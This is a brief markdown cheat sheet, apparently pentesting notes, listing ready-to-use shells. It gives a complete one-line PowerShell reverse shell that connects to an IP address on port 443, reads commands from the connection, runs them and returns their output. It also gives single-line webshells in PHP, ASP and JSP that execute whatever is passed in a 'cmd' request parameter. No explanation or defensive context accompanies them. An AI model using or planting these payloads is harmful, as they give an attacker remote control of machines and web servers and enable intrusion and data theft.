# Shells

## Reverse shells

#### Powershell
```
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.194',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Single line Webshell

#### PHP
```
<?php echo passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```
#### ASP
```
<% eval request("cmd") %>
```
#### JSP
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
